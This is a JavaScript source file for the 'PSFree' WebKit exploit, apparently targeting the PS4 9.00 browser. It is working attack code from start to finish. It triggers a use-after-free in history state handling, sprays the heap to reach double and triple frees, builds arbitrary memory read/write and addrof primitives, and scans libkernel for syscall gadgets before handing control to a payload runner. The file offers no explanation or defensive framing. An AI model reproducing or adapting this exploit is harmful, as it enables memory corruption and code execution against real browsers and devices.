// Webkit psfree by abc 
 async function webkitExploit() {
  StartTimer();
 function die(msg) {
  alert(msg);
  undefinedFunction();
 }
 function debug_log(msg) {
  print(msg);
 }
 function clear_log() {
 }
 function str2array(str, length, offset) {
    if (offset === undefined) {
        offset = 0;
    }
    let a = new Array(length);
    for (let i = 0; i < length; i++) {
        a[i] = str.charCodeAt(i + offset);
    }
    return a;
 }
 function align(a, alignment) {
    if (!(a instanceof Int)) {
        a = new Int(a);
    }
    const mask = -alignment & 0xffffffff;
    let type = a.constructor;
    let low = a.low() & mask;
    return new type(low, a.high());
 }
 async function send(url, buffer, file_name, onload=() => {}) {
    const file = new File(
        [buffer],
        file_name,
        {type:'application/octet-stream'}
    );
    const form = new FormData();
    form.append('upload', file);

    debug_log('send');
    const response = await fetch(url, {method: 'POST', body: form});

    if (!response.ok) {
        throw Error(`Network response was not OK, status: ${response.status}`);
    }
    onload();
}
 const KB = 1024;
 const MB = KB * KB;
 const GB = KB * KB * KB;
 function check_range(x) {
    return (-0x80000000 <= x) && (x <= 0xffffffff);
 }
 function unhexlify(hexstr) {
    if (hexstr.substring(0, 2) === "0x") {
        hexstr = hexstr.substring(2);
    }
    if (hexstr.length % 2 === 1) {
        hexstr = '0' + hexstr;
    }
    if (hexstr.length % 2 === 1) {
        throw TypeError("Invalid hex string");
    }
    let bytes = new Uint8Array(hexstr.length / 2);
    for (let i = 0; i < hexstr.length; i += 2) {
        let new_i = hexstr.length - 2 - i;
        let substr = hexstr.slice(new_i, new_i + 2);
        bytes[i / 2] = parseInt(substr, 16);
    }
    return bytes;
 }
 function operation(f, nargs) {
    return function () {
        if (arguments.length !== nargs)
            throw Error("Not enough arguments for function " + f.name);
        let new_args = [];
        for (let i = 0; i < arguments.length; i++) {
            if (!(arguments[i] instanceof Int)) {
                new_args[i] = new Int(arguments[i]);
            } else {
                new_args[i] = arguments[i];
            }
        }
        return f.apply(this, new_args);
    };
 }
 class Int {
    constructor(low, high) {
        let buffer = new Uint32Array(2);
        let bytes = new Uint8Array(buffer.buffer);
        if (arguments.length > 2) {
            throw TypeError('Int takes at most 2 args');
        }
        if (arguments.length === 0) {
            throw TypeError('Int takes at min 1 args');
        }
        let is_one = false;
        if (arguments.length === 1) {
            is_one = true;
        }
        if (!is_one) {
            if (typeof (low) !== 'number'
                && typeof (high) !== 'number') {
                throw TypeError('low/high must be numbers');
            }
        }
        if (typeof low === 'number') {
            if (!check_range(low)) {
                throw TypeError('low not a valid value: ' + low);
            }
            if (is_one) {
                high = 0;
                if (low < 0) {
                    high = -1;
                }
            } else {
                if (!check_range(high)) {
                    throw TypeError('high not a valid value: ' + high);
                }
            }
            buffer[0] = low;
            buffer[1] = high;
        } else if (typeof low === 'string') {
            bytes.set(unhexlify(low));
        } else if (typeof low === 'object') {
            if (low instanceof Int) {
                bytes.set(low.bytes);
            } else {
                if (low.length !== 8)
                    throw TypeError("Array must have exactly 8 elements.");
                bytes.set(low);
            }
        } else {
            throw TypeError('Int does not support your object for conversion');
        }

        this.buffer = buffer;
        this.bytes = bytes;
        this.eq = operation(function eq(b) {
            const a = this;
            return a.low() === b.low() && a.high() === b.high();
        }, 1);
        this.neg = operation(function neg() {
            let type = this.constructor;
            let low = ~this.low();
            let high = ~this.high();
            let res = (new Int(low, high)).add(1);
            return new type(res);
        }, 0);
        this.add = operation(function add(b) {
            let type = this.constructor;
            let low = this.low();
            let high = this.high();
            low += b.low();
            let carry = 0;
            if (low > 0xffffffff) {
                carry = 1;
            }
            high += carry + b.high();
            low &= 0xffffffff;
            high &= 0xffffffff;
            return new type(low, high);
        }, 1);
        this.sub = operation(function sub(b) {
            let type = this.constructor;
            b = b.neg();
            let low = this.low();
            let high = this.high();
            low += b.low();
            let carry = 0;
            if (low > 0xffffffff) {
                carry = 1;
            }
            high += carry + b.high();
            low &= 0xffffffff;
            high &= 0xffffffff;
            return new type(low, high);
        }, 1);
    }
    low() {
        return this.buffer[0];
    }
    high() {
        return this.buffer[1];
    }
    toString(is_pretty) {
        if (!is_pretty) {
            let low = this.low().toString(16).padStart(8, '0');
            let high = this.high().toString(16).padStart(8, '0');
            return '0x' + high + low;
        }
        let high = this.high().toString(16).padStart(8, '0');
        high = high.substring(0, 4) + '_' + high.substring(4);
        let low = this.low().toString(16).padStart(8, '0');
        low = low.substring(0, 4) + '_' + low.substring(4);
        return '0x' + high + '_' + low;
    }
 }
 Int.Zero = new Int(0);
 Int.One = new Int(1);
 let mem = null;
 function init_module(memory) {
    mem = memory;
 }
 class Addr extends Int {
    read8(offset) {
        const addr = this.add(offset);
        return mem.read8(addr);
    }
    read16(offset) {
        const addr = this.add(offset);
        return mem.read16(addr);
    }
    read32(offset) {
        const addr = this.add(offset);
        return mem.read32(addr);
    }
    read64(offset) {
        const addr = this.add(offset);
        return mem.read64(addr);
    }
    readp(offset) {
        const addr = this.add(offset);
        return mem.readp(addr);
    }
    write8(offset, value) {
        const addr = this.add(offset);
        mem.write8(addr, value);
    }
    write16(offset, value) {
        const addr = this.add(offset);
        mem.write16(addr, value);
    }
    write32(offset, value) {
        const addr = this.add(offset);
        mem.write32(addr, value);
    }
    write64(offset, value) {
        const addr = this.add(offset);
        mem.write64(addr, value);
    }
 }
 class MemoryBase {
    _addrof(obj) {
        if (typeof obj !== 'object'
            && typeof obj !== 'function'
        ) {
            throw TypeError('addrof argument not a JS object');
        }
        this.worker.a = obj;
        write64(this.main, view_m_vector, this.butterfly.sub(0x10));
        let res = read64(this.worker, 0);
        write64(this.main, view_m_vector, this._current_addr);
        return res;
    }
    addrof(obj) {
        return new Addr(this._addrof(obj));
    }
    set_addr(addr) {
        if (!(addr instanceof Int)) {
            throw TypeError('addr must be an Int');
        }
        this._current_addr = addr;
        write64(this.main, view_m_vector, this._current_addr);
    }
    get_addr() {
        return this._current_addr;
    }
    write0(size, offset, value) {
        const i = offset + 1;
        if (i >= 2**32 || i < 0) {
            throw RangeError(`read0() invalid offset: ${offset}`);
        }
        this.set_addr(new Int(-1));
        switch (size) {
            case 8: {
                this.worker[i] = value;
            }
            case 16: {
                write16(this.worker, i, value);
            }
            case 32: {
                write32(this.worker, i, value);
            }
            case 64: {
                write64(this.worker, i, value);
            }
            default: {
                throw RangeError(`write0() invalid size: ${size}`);
            }
        }
    }
    read8(addr) {
        this.set_addr(addr);
        return this.worker[0];
    }
    read16(addr) {
        this.set_addr(addr);
        return read16(this.worker, 0);
    }
    read32(addr) {
        this.set_addr(addr);
        return read32(this.worker, 0);
    }
    read64(addr) {
        this.set_addr(addr);
        return read64(this.worker, 0);
    }
    readp(addr) {
        return new Addr(this.read64(addr));
    }
    write8(addr, value) {
        this.set_addr(addr);
        this.worker[0] = value;
    }
    write16(addr, value) {
        this.set_addr(addr);
        write16(this.worker, 0, value);
    }
    write32(addr, value) {
        this.set_addr(addr);
        write32(this.worker, 0, value);
    }
    write64(addr, value) {
        this.set_addr(addr);
        write64(this.worker, 0, value);
    }
 }
 class Memory extends MemoryBase {
    constructor(main, worker)  {
        super();
        this.main = main;
        this.worker = worker;
        worker.a = 0;
        this.butterfly = read64(main, js_butterfly);
        write32(main, view_m_length, 0xffffffff);
        this._current_addr = Int.Zero;
        init_module(this);
    }
 }
 function read(u8_view, offset, size) {
    let res = 0;
    for (let i = 0; i < size; i++) {
        res += u8_view[offset + i] << i*8;
    }
    return res >>> 0;
 }
 function read16(u8_view, offset) {
    return read(u8_view, offset, 2);
 }
 function read32(u8_view, offset) {
    return read(u8_view, offset, 4);
 }
 function read64(u8_view, offset) {
    let res = [];
    for (let i = 0; i < 8; i++) {
        res.push(u8_view[offset + i]);
    }
    return new Int(res);
 } 
 function write(u8_view, offset, value, size) {
    for (let i = 0; i < size; i++) {
        u8_view[offset + i]  = (value >>> i*8) & 0xff;
    }
 }
 function write16(u8_view, offset, value) {
    write(u8_view, offset, value, 2);
 }
 function write32(u8_view, offset, value) {
    write(u8_view, offset, value, 4);
 }
 function write64(u8_view, offset, value) {
    if (!(value instanceof Int)) {
        throw TypeError('write64 value must be an Int');
    }
    let low = value.low();
    let high = value.high();
    for (let i = 0; i < 4; i++) {
        u8_view[offset + i]  = (low >>> i*8) & 0xff;
    }
    for (let i = 0; i < 4; i++) {
        u8_view[offset + 4 + i]  = (high >>> i*8) & 0xff;
    }
 }
 function sread64(str, offset) {
    let res = [];
    for (let i = 0; i < 8; i++) {
        res.push(str.charCodeAt(offset + i));
    }
    return new Int(res);
 } 
 function make_buffer(addr, size) {
    const u = new Uint8Array(1001);
    const u_addr = mem.addrof(u);
    const old_addr = u_addr.read64(view_m_vector);
    const old_size = u_addr.read32(view_m_length);
    u_addr.write64(view_m_vector, addr);
    u_addr.write32(view_m_length, size);
    const copy = new Uint8Array(u.length);
    copy.set(u);
    const res = copy.buffer;
    u_addr.write64(view_m_vector, old_addr);
    u_addr.write32(view_m_length, old_size);
    return res;
 }
 function check_magic_at(p, is_text) {
    const text_magic = [
        new Int([0x55, 0x48, 0x89, 0xe5, 0x41, 0x57, 0x41, 0x56]),
        new Int([0x41, 0x55, 0x41, 0x54, 0x53, 0x50, 0x48, 0x8d]),
    ];
    const data_magic = [
        new Int(0x20),
        new Int(0x3c13f4bf, 0x2),
    ];
    const magic = is_text ? text_magic : data_magic;
    const value = [p.read64(0), p.read64(8)];
    return value[0].eq(magic[0]) && value[1].eq(magic[1]);
 }
 function find_base(addr, is_text, is_back) {
    const page_size = 16 * KB;
    addr = align(addr, page_size);
    const offset = (is_back ? -1 : 1) * page_size;
    while (true) {
        if (check_magic_at(addr, is_text)) {
            break;
        }
        addr = addr.add(offset)
    }
    return addr;
 }
 function get_view_vector(view) {
    if (!ArrayBuffer.isView(view)) {
        throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
    }
    return mem.addrof(view).readp(view_m_vector);
 }
 function resolve_import(import_addr) {
    if (import_addr.read16(0) !== 0x25ff) {
        throw Error(
            `instruction at ${import_addr} is not of the form: jmp qword`
            + ' [rip + X]'
        );
    }
    const disp = import_addr.read32(2);
    const offset = new Int(disp, disp >> 31);
    const function_addr = import_addr.readp(offset.add(6));
    return function_addr;
 }
 function init_syscall_array(
    syscall_array,
    libkernel_web_base,
    max_search_size,
 ) {
    if (typeof max_search_size !== 'number') {
        throw TypeError(`max_search_size is not a number: ${max_search_size}`);
    }
    if (max_search_size < 0) {
        throw Error(`max_search_size is less than 0: ${max_search_size}`);
    }
    const libkernel_web_buffer = make_buffer(
        libkernel_web_base,
        max_search_size,
    );
    const kbuf = new Uint8Array(libkernel_web_buffer);
    let text_size = 0;
    let found = false;
    for (let i = 0; i < max_search_size; i++) {
        if (kbuf[i] === 0x72
            && kbuf[i + 1] === 0x64
            && kbuf[i + 2] === 0x6c
            && kbuf[i + 3] === 0x6f
        ) {
            text_size = i;
            found = true;
            break;
        }
    }
    if (!found) {
        throw Error(
            '"rdlo" string not found in libkernel_web, base address:'
            + ` ${libkernel_web_base}`
        );
    }
    for (let i = 0; i < text_size; i++) {
        if (kbuf[i] === 0x48
            && kbuf[i + 1] === 0xc7
            && kbuf[i + 2] === 0xc0
            && kbuf[i + 7] === 0x49
            && kbuf[i + 8] === 0x89
            && kbuf[i + 9] === 0xca
            && kbuf[i + 10] === 0x0f
            && kbuf[i + 11] === 0x05
        ) {
            const syscall_num = read32(kbuf, i + 3);
            syscall_array[syscall_num] = libkernel_web_base.add(i);
            i += 11;
        }
    }
}
 const ps4_9_00 = 2;
 const target = ps4_9_00;
 const ssv_len = 0x50;
 const num_reuse = 0x4000;
 const js_butterfly = 0x8;
 const view_m_vector = 0x10;
 const view_m_length = 0x18;
 const view_m_mode = 0x1c;
 const size_view = 0x20;
 const strimpl_strlen = 4;
 const strimpl_m_data = 8;
 const strimpl_inline_str = 0x14;
 const size_strimpl = 0x18;
 const original_strlen = ssv_len - size_strimpl;
 const buffer_len = 0x20;
 const num_str = 0x4000;
 const num_gc = 30;
 const num_space = 19;
 const original_loc = window.location.pathname;
 const loc = original_loc + '#foo';
 let rstr = null;
 let view_leak_arr = [];
 let jsview = [];
 let s1 = {views : []};
 let view_leak = null;
 let input = document.body.appendChild(document.createElement("input"));
 input.style.position = "absolute";
 input.style.top = "-100px";
 let foo = document.body.appendChild(document.createElement("a"));
 foo.id = "foo";
 let pressure = null;
 function gc(num_loop) {
   pressure = Array(100);
   for (let i = 0; i < num_loop; i++) {
       for (let i = 0; i < pressure.length; i++) {
           pressure[i] = new Uint32Array(0x40000);
       }
       pressure = Array(100);
   }
   pressure = null;
 }
 function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
 }
 function prepare_uaf() {
    history.pushState('state0', '');
    for (let i = 0; i < num_space; i++) {
        history.replaceState('state0', '');
    }
    history.replaceState("state1", "", loc);
    history.pushState("state2", "");
    for (let i = 0; i < num_space; i++) {
        history.replaceState("state2", "");
    }
 }
 function free(save) {
    history.replaceState('state3', '', original_loc);
    for (let i = 0; i < num_reuse; i++) {
        let view = new Uint8Array(new ArrayBuffer(ssv_len));
        for (let i = 0; i < view.length; i++) {
            view[i] = 0x41;
        }
        save.views.push(view);
    }
 }
 function check_spray(views) {
    if (views.length !== num_reuse) {
        debug_log(`views.length: ${views.length}`);
        die('views.length !== num_reuse, restart the entire exploit');
    }
    for (let i = 0; i < num_reuse; i++) {
        if (views[i][0] !== 0x41) {
            return i;
        }
    }
    return null;
 }
 async function use_after_free(pop_func, save) {
    const pop_promise = new Promise((resolve, reject) => {
        function pop_wrapper(event) {
            try {
                pop_func(event, save);
            } catch (e) {
                reject(e);
            }
            resolve();
        }
        addEventListener("popstate", pop_wrapper, {once:true});
    });
    prepare_uaf();
    let num_free = 0;
    function onblur() {
        if (num_free > 0)  {
            die('multiple free()s, restart the entire exploit');
        }
        free(save);
        num_free++;
    }
    input.onblur = onblur;
    await new Promise((resolve) => {
        input.addEventListener('focus', resolve, {once:true});
        input.focus();
    });
    history.back();
    await pop_promise;
 }
 async function setup_ar(save) {
    const view = save.ab;
    view[0] = 1;
    for (let i = 1; i < view.length; i++) {
        view[i] = 0;
    }
    delete save.views;
    delete save.pop;
    gc(num_gc);
    let total_sleep = 0;
    const num_sleep = 8;
    while (true && target !== ps4_9_00) {
        await sleep(num_sleep);
        total_sleep += num_sleep;
        if (view[0] !== 1) {
            break;
        }
    }
    let num_spray = 0;
    while (true) {
        const obj = {};
        num_spray++;
        for (let i = 0; i < num_str; i++) {
            let str = new String(
                'B'.repeat(original_strlen - 5)
                + i.toString().padStart(5, '0')
            );
            obj[str] = 0x1337;
        }
        if (view[strimpl_inline_str] === 0x42) {
            write32(view, strimpl_strlen, 0xffffffff);
        } else {
            continue;
        }
        let found = false;
        const str_arr = Object.getOwnPropertyNames(obj);
        for (let i = 0; i < str_arr.length; i++) {
            if (str_arr[i].length > 0xff) {
                rstr = str_arr[i];
                found = true;
                break;
            }
        }
        if (!found) {
            continue;
        }
        return;
    }
 }
 async function double_free(save) {
    const view = save.ab;
    await setup_ar(save);
    let buffer = new ArrayBuffer(buffer_len);
    let tmp = [];
    const num_alloc = 0x10000;
    const num_threshold = 0xfc00;
    const num_diff = num_alloc - num_threshold;
    for (let i = 0; i < num_alloc; i++) {
        if (i >= num_threshold) {
            view_leak_arr.push(new Uint8Array(buffer));
        } else {
            tmp.push(new Uint8Array(buffer));
        }
    }
    tmp = null;
    let props = [];
    for (let i = 0; i < num_diff; i++) {
        props.push({ value: 0x43434343 });
        props.push({ value: view_leak_arr[i] });
    }
    search: while (true) {
        Object.defineProperties({}, props);
        for (let i = 0; i < 0x800000; i++) {
            let v = null;
            if (rstr.charCodeAt(i) === 0x43 &&
                rstr.charCodeAt(i + 1) === 0x43 &&
                rstr.charCodeAt(i + 2) === 0x43 &&
                rstr.charCodeAt(i + 3) === 0x43
            ) {
                if (rstr.charCodeAt(i + 0x08) === 0x00 &&
                    rstr.charCodeAt(i + 0x0f) === 0x00 &&
                    rstr.charCodeAt(i + 0x10) === 0x00 &&
                    rstr.charCodeAt(i + 0x17) === 0x00 &&
                    rstr.charCodeAt(i + 0x18) === 0x0e &&
                    rstr.charCodeAt(i + 0x1f) === 0x00 &&
                    rstr.charCodeAt(i + 0x28) === 0x00 &&
                    rstr.charCodeAt(i + 0x2f) === 0x00 &&
                    rstr.charCodeAt(i + 0x30) === 0x00 &&
                    rstr.charCodeAt(i + 0x37) === 0x00 &&
                    rstr.charCodeAt(i + 0x38) === 0x0e &&
                    rstr.charCodeAt(i + 0x3f) === 0x00
                ) {
                    v = str2array(rstr, 8, i + 0x20);
                } else if (rstr.charCodeAt(i + 0x10) === 0x43 &&
                    rstr.charCodeAt(i + 0x11) === 0x43 &&
                    rstr.charCodeAt(i + 0x12) === 0x43 &&
                    rstr.charCodeAt(i + 0x13) === 0x43) {
                    v = str2array(rstr, 8, i + 8);
                }
            }
            if (v !== null) {
                view_leak = new Int(v);
                break search;
            }
        }
    }
    let rstr_addr = read64(view, strimpl_m_data);
    write64(view, strimpl_m_data, view_leak);
    for (let i = 0; i < 4; i++) {
        jsview.push(sread64(rstr, i*8));
    }
    write64(view, strimpl_m_data, rstr_addr);
    write32(view, strimpl_strlen, original_strlen);
 }
 function find_leaked_view(rstr, view_rstr, view_m_vector, view_arr) {
    const old_m_data = read64(view_rstr, strimpl_m_data);
    let res = null;
    write64(view_rstr, strimpl_m_data, view_m_vector);
    for (const view of view_arr) {
        const magic = 0x41424344;
        write32(view, 0, magic);
        if (sread64(rstr, 0).low() === magic) {
            res = view;
            break;
        }
    }
    write64(view_rstr, strimpl_m_data, old_m_data);
    if (res === null) {
        die('not found');
    }
    return res;
 }
 class Reader {
    constructor(rstr, view_rstr, leaker, leaker_addr) {
        this.rstr = rstr;
        this.view_rstr = view_rstr;
        this.leaker = leaker;
        this.leaker_addr = leaker_addr;
        this.old_m_data = read64(view_rstr, strimpl_m_data);
        leaker.a = 0;
    }
    addrof(obj) {
        if (typeof obj !== 'object'
            && typeof obj !== 'function'
        ) {
            throw TypeError('addrof argument not a JS object');
        }
        this.leaker.a = obj;
        write64(this.view_rstr, strimpl_m_data, this.leaker_addr);
        const butterfly = sread64(this.rstr, js_butterfly);
        write64(this.view_rstr, strimpl_m_data, butterfly.sub(0x10));
        const res = sread64(this.rstr, 0);
        write64(this.view_rstr, strimpl_m_data, this.old_m_data);
        return res;
    }
    get_view_vector(view) {
        if (!ArrayBuffer.isView(view)) {
            throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
        }
        write64(this.view_rstr, strimpl_m_data, this.addrof(view));
        const res = sread64(this.rstr, view_m_vector);
        write64(this.view_rstr, strimpl_m_data, this.old_m_data);
        return res;
    }
 }
 function setup_ssv_data(reader) {
    const r = reader;
    const size_vector = 0x10;
    const size_abc = target === ps4_9_00 ? 0x18 : 0x20;
    const m_data = new Uint8Array(size_vector);
    const data = new Uint8Array(9);
    write64(m_data, 0, r.get_view_vector(data));
    write32(m_data, 8, data.length);
    write32(m_data, 0xc, data.length);
    const CurrentVersion = 6;
    const ArrayBufferTransferTag = 23;
    write32(data, 0, CurrentVersion);
    data[4] = ArrayBufferTransferTag;
    write32(data, 5, 0);
    const abc_vector = new Uint8Array(size_vector);
    const abc = new Uint8Array(size_abc);
    write64(abc_vector, 0, r.get_view_vector(abc));
    write32(abc_vector, 8, 1);
    write32(abc_vector, 0xc, 1);
    const worker = new Uint8Array(new ArrayBuffer(1));
    if (target !== ps4_9_00) {
        write64(abc, 0, Int.Zero);
        write64(abc, 8, Int.Zero);
        write64(abc, 0x10, r.addrof(worker));
        write32(abc, 0x18, size_view);
    } else {
        write64(abc, 0, r.addrof(worker));
        write32(abc, 8, 0);
        write16(abc, 0xc, 0);
        write32(abc, 0xe, 0);
        write16(abc, 0x12, 0);
        write32(abc, 0x14, size_view);
    }
    return {
        m_data,
        m_arrayBufferContentsArray : r.get_view_vector(abc_vector),
        worker,
        nogc : [
            data,
            abc_vector,
            abc,
        ],
     };
 }
 async function setup_arw(save, ssv_data) {
    const num_msg = 1000;
    const view = save.ab;
    let msgs = [];
    function onmessage(event) {
        msgs.push(event);
    }
    addEventListener('message', onmessage);
    rstr = null;
    while (true) {
        for (let i = 0; i < num_msg; i++) {
            postMessage('', origin);
        }
        while (msgs.length !== num_msg) {
            await sleep(100);
        }
        if (view[strimpl_inline_str] !== 0x42) {
            break;
        }
        msgs = [];
    }
    removeEventListener('message', onmessage);
    const copy = [];
    for (let i = 0; i < view.length; i++) {
        copy.push(view[i]);
    }
    const {m_data, m_arrayBufferContentsArray, worker, nogc} = ssv_data;
    write64(view, 8, read64(m_data, 0));
    write64(view, 0x10, read64(m_data, 8));
    write64(view, 0x18, m_arrayBufferContentsArray);
    for (const msg of msgs) {
        if (msg.data !== '') {
            const u = new Uint8Array(msg.data);
            const mem = new Memory(u, worker);
            view.set(copy);
            view_leak_arr = null;
            view_leak = null;
            jsview = null;
            input = null;
            foo = null;
            return;
        }
    }
    die('no arbitrary r/w');
 }
 async function triple_free(
    save,
    jsview,
    view_leak_arr,
    leaked_view_addr,
 ) {
    const leaker = find_leaked_view(rstr, save.ab, jsview[2], view_leak_arr);
    let r = new Reader(rstr, save.ab, leaker, leaked_view_addr);
    const ssv_data = setup_ssv_data(r);
    r = null;
    await setup_arw(save, ssv_data);
 }
 function pop(event, save) {
    let spray_res = check_spray(save.views);
    if (spray_res === null) {
        die('failed spray');
    } else {
        save.pop = event;
        save.ab = save.views[spray_res];
    }
 }
 async function get_ready() {
    await new Promise((resolve, reject) => {
        if (document.readyState !== "complete") {
            document.addEventListener("DOMContentLoaded", resolve);
            return;
        }
        resolve();
    });
 }
    await get_ready();
    await use_after_free(pop, s1);
    await sleep(0);
    await double_free(s1);
    await triple_free(s1, jsview, view_leak_arr, view_leak);
    let prim = {
        read1(addr) {
            addr = new Int(addr.low, addr.hi);
            const res = mem.read8(addr);
            return res;
        },
        read2(addr) {
            addr = new Int(addr.low, addr.hi);
            const res = mem.read16(addr);
            return res;
        },
        read4(addr) {
            addr = new Int(addr.low, addr.hi);
            const res = mem.read32(addr);
            return res;
        },
        read8(addr) {
            addr = new Int(addr.low, addr.hi);
            const res = mem.read64(addr);
            return new int64(res.low(), res.high());
        },
        write1(addr, value) {
            addr = new Int(addr.low, addr.hi);
            mem.write8(addr, value);
        },
        write2(addr, value) {
            addr = new Int(addr.low, addr.hi);
            mem.write16(addr, value);
        },
        write4(addr, value) {
            addr = new Int(addr.low, addr.hi);
            mem.write32(addr, value);
        },
        write8(addr, value) {
            addr = new Int(addr.low, addr.hi);
            if (value instanceof int64) {
                value = new Int(value.low, value.hi);
                mem.write64(addr, value);
            } else {
                mem.write64(addr, new Int(value));
            }
        },
        leakval(obj) {
            const res = mem.addrof(obj);
            return new int64(res.low(), res.high());
        }
    };
   EndTimer();
 window.p = prim;
 run_hax();
}